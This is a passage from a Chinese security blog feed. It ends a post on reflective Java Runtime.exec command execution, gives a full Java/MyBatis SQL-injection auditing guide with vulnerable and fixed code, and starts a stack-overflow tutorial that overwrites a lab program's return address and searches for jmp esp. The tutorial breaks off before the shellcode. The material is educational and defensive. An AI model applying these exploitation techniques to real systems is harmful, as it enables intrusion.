class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream in = process.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">System.out.println(IOUtils.toString(in, <span class="string">"UTF-8"</span>));</span><br></pre></td></tr></table></figure><p>反射调用<code>Runtime</code>实现本地命令执行的流程如下：</p><ol><li>反射获取<code>Runtime</code>类对象(<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>)。</li><li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为<code>Runtime</code>的构造方法是<code>private</code>的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)。</li><li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod(&quot;exec&quot;, String.class);</code>)。</li><li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)。</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>P牛知识星球中的java漫谈</p><p>凌天实验室：<a href="https://mp.weixin.qq.com/s/SA\_M0yQiCh8nM0qL2xwT-A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/SA\_M0yQiCh8nM0qL2xwT-A</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计自学：sql注入篇</title>
      <link href="/2020/07/24/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/2020/07/24/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>主要是因为自己的学习Java 代码审计中的学习思路吧，主要自己一个人学习，有点闭门造车，百度学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>虽然基础，但是还是介绍一下吧</p><p>SQL 注入老生常谈，就是 SQL 命令插入请求中，并在服务器端被接收后用，没有有效的过滤，导致服务器执行了意料之外的恶意的 SQL 命令，最终达到恶意的脱数据。</p><p>Java 的 SQL 注入和 PHP 中的 SQL 注入，其实原理都是一样的，理论上只要是与数据库存在数据交互，只要传入的数据完全受用户控制，没有有效的过滤都有可能出现 SQL 注入的。</p><p>java的特殊是有一些框架会托管一部分的数据库的操作，我们要了解一下</p><h1 id="0x02-分类：拼接和预编译"><a href="#0x02-分类：拼接和预编译" class="headerlink" title="0x02 分类：拼接和预编译"></a>0x02 分类：拼接和预编译</h1><h2 id="1、直接拼接，未进行过滤"><a href="#1、直接拼接，未进行过滤" class="headerlink" title="1、直接拼接，未进行过滤"></a>1、直接拼接，未进行过滤</h2><p>将<code>request.getParameter(&quot;id&quot;)</code>获取的id直接放在SQL语句，没有过滤而且是拼接的情况</p><p>以前的JDBC的方式，的直接拼接方式，存在sql注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request.getParameter(&quot;userId&quot;)</span><br><span class="line"></span><br><span class="line">private String getNameByUserId(String userId) &#123;</span><br><span class="line">    Connection conn &#x3D; getConn();&#x2F;&#x2F;获得连接</span><br><span class="line">    String sql &#x3D; &quot;select name from user where id&#x3D;&quot; + userId;</span><br><span class="line">    PreparedStatement pstmt &#x3D;  conn.prepareStatement(sql);</span><br><span class="line">    ResultSet rs&#x3D;pstmt.executeUpdate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局搜索查看：<code>=&quot;</code>或者<code>sql</code>的问题</p><p><strong>防止措施，修复方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;安全的，预编译的，防止了sql注入</span><br><span class="line">Connection conn &#x3D; getConn();&#x2F;&#x2F;获得连接</span><br><span class="line">String sql &#x3D; &quot;select id, username, password, role from user where id&#x3D;?&quot;; &#x2F;&#x2F;执行sql前会预编译号该条语句</span><br><span class="line">PreparedStatement pstmt &#x3D; conn.prepareStatement(sql); </span><br><span class="line">pstmt.setString(1, id); </span><br><span class="line">ResultSet rs&#x3D;pstmt.executeUpdate();</span><br></pre></td></tr></table></figure><h2 id="2、Mybatis和Hibernate-框架"><a href="#2、Mybatis和Hibernate-框架" class="headerlink" title="2、Mybatis和Hibernate 框架"></a>2、Mybatis和Hibernate 框架</h2><p>主要是预编译的错误使用</p><p>框架主要都是使用注解或者xml将java对象与数据库sql操作对应。</p><p>下面以 Mybatis 讲解一下</p><ul><li>mybatis的maven配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.5.2&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><ul><li>config.xml 配置数据库连接的文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE configuration</span><br><span class="line">        PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot;</span><br><span class="line">        &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-config.dtd&quot;&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;environments default&#x3D;&quot;dev&quot;&gt;</span><br><span class="line">        &lt;environment id&#x3D;&quot;dev&quot;&gt;</span><br><span class="line">            &lt;transactionManager type&#x3D;&quot;JDBC&quot;&#x2F;&gt;</span><br><span class="line">            &lt;dataSource type&#x3D;&quot;POOLED&quot;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;driver&quot; value&#x3D;&quot;com.mysql.cj.jdbc.Driver&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;url&quot;</span><br><span class="line">                          value&#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;mybatistest&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;root&quot;&#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;dataSource&gt;</span><br><span class="line">        &lt;&#x2F;environment&gt;</span><br><span class="line">    &lt;&#x2F;environments&gt;</span><br><span class="line">    &lt;mappers&gt;</span><br><span class="line">        &lt;mapper resource&#x3D;&quot;UserMapper.xml&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;mappers&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure><p>主要注意的点！</p><ul><li>UserMapper.xml</li></ul><p>正常预编译</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByNameAndPassword"</span> <span class="attr">parameterType</span>=<span class="string">"java.util.Map"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span><br><span class="line">select id, username, password, role</span><br><span class="line">from user</span><br><span class="line">where username = #&#123;username,jdbcType=VARCHAR&#125;</span><br><span class="line">and password = #&#123;password,jdbcType=VARCHAR&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>存在漏洞的预编译</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByNameAndPassword"</span> <span class="attr">parameterType</span>=<span class="string">"java.util.Map"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span><br><span class="line">select id, username, password, role</span><br><span class="line">from user</span><br><span class="line">where username = $&#123;username,jdbcType=VARCHAR&#125;</span><br><span class="line">and password = $&#123;password,jdbcType=VARCHAR&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="和-的区别："><a href="#和-的区别：" class="headerlink" title="#和$的区别："></a><strong>#和$的区别：</strong></h3><p>1、#将传入的数据都当成一个字符串，会对自动传入的数据加一个双引号，正确的预编译，输入的参数会全部变成查询的部分</p><p>2、 将 传 入 的 数 据 直 接 拼 接 在 s q l 中 。 造 成 s q l 注 入 如 ： w h e r e u s e r n a m e = 将传入的数据直接拼接在sql中。造成sql注入 如：where username= 将传入的数据直接拼接在sql中。造成sql注入如：whereusername={username}，如果传入的值是111,那么解析成sql时的值为where username=111；<br>如果传入的值是1 and 1=1 ;，则解析成的sql为：select id, username, password, role from user where username=1 and 1=1</p><h1 id="0x03-MyBatis框架易产生SQL注入漏洞的三种情况："><a href="#0x03-MyBatis框架易产生SQL注入漏洞的三种情况：" class="headerlink" title="0x03 MyBatis框架易产生SQL注入漏洞的三种情况："></a>0x03 MyBatis框架易产生SQL注入漏洞的三种情况：</h1><h2 id="1、模糊查询"><a href="#1、模糊查询" class="headerlink" title="1、模糊查询"></a>1、模糊查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from news where title like ‘%#&#123;title&#125;%’</span><br></pre></td></tr></table></figure><p>在这种情况下使用#程序会报错，新手程序员就把#号改成了$,这样如果java代码层面没有对用户输入的内容做处理势必会产生SQL注入漏洞。</p><p>正确写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where tile like concat(‘%’,#&#123;title&#125;, ‘%’)</span><br></pre></td></tr></table></figure><h2 id="2、in-之后的多个参数"><a href="#2、in-之后的多个参数" class="headerlink" title="2、in 之后的多个参数"></a>2、in 之后的多个参数</h2><p>in之后多个id查询时使用# 同样会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from news where id in (#&#123;ids&#125;)</span><br></pre></td></tr></table></figure><p>正确用法为使用foreach，而不是将#替换为$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id in&lt;foreach collection&#x3D;&quot;ids&quot; item&#x3D;&quot;item&quot; open&#x3D;&quot;(&quot;separatosr&#x3D;&quot;,&quot; close&#x3D;&quot;)&quot;&gt;#&#123;ids&#125; &lt;&#x2F;foreach&gt;</span><br></pre></td></tr></table></figure><h2 id="3、order-by-之后"><a href="#3、order-by-之后" class="headerlink" title="3、order by 之后"></a>3、order by 之后</h2><p>默认情况下，使用＃{}格式的语法会导致MyBatis的创建的PreparedStatement参数并安全地设置参数（就像使用？一样）。这样做更安全，更迅速，通常也是首选做法。</p><p>当根据发布时间、点击量等信息对新闻进行排序的时候，如果考虑安全编码规范问题，其对应的SQL语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from news where title &#x3D;‘123’ order by #&#123;time&#125; asc</span><br></pre></td></tr></table></figure><p>但由于发布时间time不是用户输入的参数，无法使用预编译。研发人员将SQL查询语句修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from news where title &#x3D;‘123’ order by $&#123;time&#125; asc</span><br></pre></td></tr></table></figure><p>修改之后，程序通过预编译，但是产生了SQL语句拼接问题，极有可能引发SQL注入漏洞。</p><p>不过有时你就是想直接在SQL语句中插入一个不转义的字符串。比如，像ORDER BY，你可以这样来使用：ORDER BY $ {COLUMNNAME}。这里的MyBatis不会修改或者转义字符串。</p><p>需要注意的是在mybatis-generator自动生成的SQL语句中，order by使用的也是$，而like和in没有问题。</p><h1 id="0x04-Hibernate防止SQL注入"><a href="#0x04-Hibernate防止SQL注入" class="headerlink" title="0x04 Hibernate防止SQL注入"></a><strong>0x04 Hibernate防止SQL注入</strong></h1><p><strong>对参数名称进行绑定</strong>在HQL语句中定义命名参数要用”:”开头，形式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Query query&#x3D;session.createQuery(“from User user where user.name&#x3D;:customername and user:customerage&#x3D;:age ”); </span><br><span class="line">query.setString(“customername”,name); </span><br><span class="line">query.setInteger(“customerage”,age);</span><br></pre></td></tr></table></figure><p><strong>按参数位置邦定：</strong><br>在HQL查询语句中用”?”来定义参数位置，形式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Query query&#x3D;session.createQuery(“from User user where user.name&#x3D;? and user.age &#x3D;? ”); </span><br><span class="line">query.setString(0,name); </span><br><span class="line">query.setInteger(1,age);</span><br></pre></td></tr></table></figure><p><strong>setParameter()方法： ,</strong><br>在Hibernate的HQL查询中可以通过setParameter()方法邦定任意类型的参数，如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String hql&#x3D;”from User user where user.name&#x3D;:customername ”; </span><br><span class="line">Query query&#x3D;session.createQuery(hql); </span><br><span class="line">query.setParameter(“customername”,name,Hibernate.STRING);</span><br></pre></td></tr></table></figure><p><strong>setProperties()方法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Entity entity&#x3D;new Entity();</span><br><span class="line">entity.setXx(“xx”);</span><br><span class="line">entity.setYy(100);</span><br><span class="line">Query query&#x3D;session.createQuery(“from Entity c where c.xx&#x3D;:xx and c.yy&#x3D;:yy ”); </span><br><span class="line">query.setProperties(entity);</span><br></pre></td></tr></table></figure><h1 id="0x05-挖掘方法"><a href="#0x05-挖掘方法" class="headerlink" title="0x05 挖掘方法"></a>0x05 挖掘方法</h1><p>使用idea 搜索$关键字</p><p>可以先筛选xml文件搜索$,逐个分析，要特别注意mybatis-generator的order by注入</p><p>Ctrl+shift+F 调出Find in Path，筛选后缀xml，搜索$关键字</p><p>找到是mybatis的数据库文件</p><p>找到调用函数后，alt+f7查看调用链，检查中间是否被过滤</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计java代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二进制漏洞：从简单栈溢出到写自己编写shellcode</title>
      <link href="/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/"/>
      <url>/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>本次主要记录缓冲器溢出的：原理、实现和shellcode的编写</p><p>详细的去理解原理，和底层开始写shellcode</p><p>本次实验的C代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> authenticated;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">44</span>];</span><br><span class="line">authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="built_in">buffer</span>,password);<span class="comment">//over flowed here!</span></span><br><span class="line"><span class="keyword">return</span> authenticated;</span><br><span class="line">&#125; </span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">FILE * fp;</span><br><span class="line">LoadLibrary(<span class="string">"user32.dll"</span>);<span class="comment">//prepare for messagebox</span></span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">"password.txt"</span>,<span class="string">"rw+"</span>)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,password);</span><br><span class="line">valid_flag = verify_password(password);</span><br><span class="line"><span class="keyword">if</span>(valid_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"incorrect password!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>1、首先应该理解函数调用的知识，这个知识在上一部汇编基础介绍过</p><p>2、漏洞存在于 strcpy(buffer,password);这个函数，在拷贝时候没有检查字符串的大小，导致了越界写入，超出了预期的范围，导致栈内的内存溢出和破坏。</p><p>3、如下图所示，我们从buffer开始淹没数据，覆盖前栈ebp，将返回地址覆盖成 jmp esp，随后执行下一条指令，开始执行我们要执行的恶意shellcode</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAyMTA2MzYucG5n?x-oss-process=image/format,png" alt="image-20200630175547142"></p><h2 id="0x02-先找main函数"><a href="#0x02-先找main函数" class="headerlink" title="0x02 先找main函数"></a>0x02 先找main函数</h2><p>大概两种方法：</p><h3 id="第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数"><a href="#第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数" class="headerlink" title="第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数"></a>第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数</h3><p>对于这个题目来说，找到主函数可以用找字符串的方法来找，</p><p>右键查找所以的字符串</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzA0MDEucG5n?x-oss-process=image/format,png" alt="image-20200627230401048"></p><p>然后看见主函数运用的字符，直接点进去，就是主函数</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzAxMDgucG5n?x-oss-process=image/format,png" alt="image-20200627230108867"></p><h3 id="第二种：利用ida分析"><a href="#第二种：利用ida分析" class="headerlink" title="第二种：利用ida分析"></a>第二种：利用ida分析</h3><p>利用IDA来查找，加载程序自动找到主函数</p><p>双击main，进去 点一下空格，找到主函数，然后去od里面找对应就可以‘</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzA2NDEucG5n?x-oss-process=image/format,png" alt="image-20200627230641354"></p><h2 id="0x03-正常运行一下程序"><a href="#0x03-正常运行一下程序" class="headerlink" title="0x03 正常运行一下程序"></a>0x03 正常运行一下程序</h2><p>正常运行程序，找到verfiy函数，进入调试</p><p>buffer 是44字节的</p><p>先写入12341234123412341234123412341234123412341234，11个1234</p><p>把buff的占满看一下栈的结构</p><p>先确定我们要淹没的地址大小和位置</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMTIzMzYucG5n?x-oss-process=image/format,png" alt="image-20200628212336143"></p><h2 id="0x04-简单的破解"><a href="#0x04-简单的破解" class="headerlink" title="0x04 简单的破解"></a>0x04 简单的破解</h2><p>基于上面的分析，只要将返回地址覆盖为想要的地址就好了</p><p>回到主函数一看 成功的地址为 0x00401133</p><p>所以我们编写 覆盖此地址，注意后面的地址是要反着写的，因为是大顶机机制</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMjM4MzYucG5n?x-oss-process=image/format,png" alt="image-20200628223836346"></p><p>运行一下，成功跳过</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMjM1NDcucG5n?x-oss-process=image/format,png" alt="image-20200628223547169"></p><h2 id="0x04-shellcode编写"><a href="#0x04-shellcode编写" class="headerlink" title="0x04 shellcode编写"></a>0x04 shellcode编写</h2><h3 id="选用-jmp-esp-作为定位-shellcode-的跳板"><a href="#选用-jmp-esp-作为定位-shellcode-的跳板" class="headerlink" title="选用 jmp esp 作为定位 shellcode 的跳板"></a>选用 jmp esp 作为定位 shellcode 的跳板</h3><p>使用 jmp esp 做“跳板”的方法是最简单，也是最常用的定位 shellcode 的方法。</p><p>在实际的漏洞利用过程中，应当注意观察漏洞函数返回时所有寄存器的值。</p><p>往往 ESP 寄存器也会指向栈顶附近，用jmp esp可以确保下一条指令是在esp下一个位置，可以保证shellcode的稳定执行</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxNzU1NDcucG5n?x-oss-process=image/format,png" alt="image-20200630175547142"></p><h3 id="获取jmp-esp的地址"><a href="#获取jmp-esp的地址" class="headerlink" title="获取jmp esp的地址"></a>获取jmp esp的地址</h3><p>本次shellcode使用 简单的 jmp esp的方法跳转</p><p>利用下面函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; searchjmpesp.cpp : Defines the entry point for the console application.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">#include&quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt; </span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#define DLL_NAME &quot;user32.dll&quot; </span><br><span class="line">main() </span><br><span class="line">&#123; </span><br><span class="line">BYTE* ptr; </span><br><span class="line">int position,address; </span><br><span class="line">HINSTANCE handle; </span><br><span class="line">BOOL done_flag &#x3D; FALSE; </span><br><span class="line">handle&#x3D;LoadLibrary(DLL_NAME); </span><br><span class="line">if(!handle) </span><br><span class="line">&#123; </span><br><span class="line">printf(&quot;load dll error&quot;);</span><br><span class="line">&#125; </span><br><span class="line">ptr &#x3D; (BYTE*)handle; </span><br><span class="line">for(position &#x3D; 0; !done_flag; position++) </span><br><span class="line">&#123; </span><br><span class="line">try</span><br><span class="line">&#123; </span><br><span class="line">if(ptr[position] &#x3D;&#x3D; 0xFF &amp;&amp; ptr[position+1] &#x3D;&#x3D; 0xE4) </span><br><span class="line">&#123; </span><br><span class="line">&#x2F;&#x2F;0xFFE4 is the opcode of jmp esp</span><br><span class="line">int address &#x3D; (int)ptr + position;</span><br><span class="line">printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">catch(...)</span><br><span class="line">&#123; </span><br><span class="line">int address &#x3D; (int)ptr + position; </span><br><span class="line">printf(&quot;END OF 0x%x\n&quot;, address); </span><br><span class="line">done_flag &#x3D; true; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjkxNzA2NDcucG5n?x-oss-process=image/format,png" alt="image-20200629170646985"></p><h3 id="获取-MessageBoxA函数"><a href="#获取-MessageBoxA函数" class="headerlink" title="获取 MessageBoxA函数"></a>获取 MessageBoxA函数</h3><p>利用下面的程序获取 MessageBoxA的调用地址</p><figure class="highlight c"><table><tr><td 